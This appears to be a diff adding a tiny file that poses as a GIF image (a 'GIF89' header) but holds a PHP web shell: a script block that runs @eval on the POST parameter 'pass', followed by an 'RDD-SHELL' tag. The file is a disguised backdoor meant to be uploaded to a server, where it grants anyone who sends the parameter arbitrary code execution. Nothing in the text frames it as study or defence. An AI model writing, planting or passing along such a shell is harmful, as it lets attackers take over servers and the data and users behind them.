@@ -1,0 +1,6 @@
+GIF89
+
+<script language='php'>
+@eval($_POST['pass']);
+</script>
+RDD-SHELL
